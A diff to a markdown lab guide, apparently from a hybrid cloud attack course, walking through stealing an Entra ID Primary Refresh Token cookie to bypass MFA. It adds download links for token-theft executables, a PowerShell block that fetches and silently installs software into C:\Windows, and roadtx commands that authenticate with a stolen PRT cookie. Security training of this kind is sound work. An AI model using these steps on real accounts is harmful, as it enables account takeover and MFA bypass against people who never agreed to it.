@@ -19,13 +19,53 @@ From this point on you act as the adversary, without knowing the Entra / AD Cred
 
 ## 1. Steal-the-PRT-Cookie
 
-Note: This method will bypass MFA only if the user has authenticated using MFA in its Windows
+**Notes:** 
+- This method will bypass MFA only if the user has authenticated using MFA in its Windows
+- PRT Cookie can only be used once and its TTL is short
 
-**Note:** PRT Cookie can only be used once and its TTL is short
+**Prep:**
+Download from inside the Win11 VM [ROADToken.exe](https://github.com/shackcrack007/hybrid-attacks-course-template/raw/refs/heads/main/labs%20(for%20course%20sessions,%20not%20part%20of%20setup)/lab-3-tokens/ROADToken.exe)
 
 #### Option 1: Steal PRT Cookie using roadrecon tool
 
 Use BrowserCore.exe to request a new PRT cookie with the current existing authentication context:
+
+```powershell
+# download Firefox and install automatically
+$ProgressPreference = 'SilentlyContinue'    
+$firefoxUrl = "https://download.mozilla.org/?product=firefox-latest&os=win64&lang=en-US"
+$destination = "$env:TEMP\firefox_installer.exe"
+Invoke-WebRequest -Uri $firefoxUrl -OutFile $destination -UseBasicParsing -Force
+Start-Process -FilePath $destination -ArgumentList "/S" -Wait
+Remove-Item $destination
+
+
+# Define the download URL and the paths
+$zipUrl = "https://github.com/mozilla/geckodriver/releases/download/v0.35.0/geckodriver-v0.35.0-win32.zip"
+$tempZipPath = "$env:TEMP\geckodriver.zip"
+$extractPath = "$env:TEMP\geckodriver"
+$destinationPath = "C:\Windows"
+
+# Download the ZIP file
+Invoke-WebRequest -Uri $zipUrl -OutFile $tempZipPath -UseBasicParsing
+
+# Create a temporary folder to extract the ZIP file
+New-Item -Path $extractPath -ItemType Directory -Force
+
+# Extract the ZIP file
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory($tempZipPath, $extractPath)
+
+# Move the extracted files to the destination
+Move-Item -Path "$extractPath\*" -Destination $destinationPath -Force
+
+# Clean up the temporary files
+Remove-Item $tempZipPath
+Remove-Item $extractPath -Recurse
+
+Write-Output "Geckodriver has been downloaded, extracted, and placed in $destinationPath"
+
+```
 
 ```powershell
 # Get the nonce first
@@ -43,6 +83,7 @@ roadtx browserprtauth -url https://entra.microsoft.com --prt-cookie <eyJh... PRT
 Uses the MicrosoftAccountTokenProvider DLL to request a new PRT cookie.
 Download and Run RequestAADRefreshToken.exe from this folder (directly from inside the VM), it will save the output on disk as well as print the tokens to the console.
 
+**Prep:** Download from inside the Win11 VM [RequestAADRefreshToken.exe](https://github.com/shackcrack007/hybrid-attacks-course-template/raw/refs/heads/main/labs%20(for%20course%20sessions,%20not%20part%20of%20setup)/lab-3-tokens/RequestAADRefreshToken.exe)
 ```
 Requesting cookies for the following URIs: https://login.microsoftonline.com/
 PID  : 37808
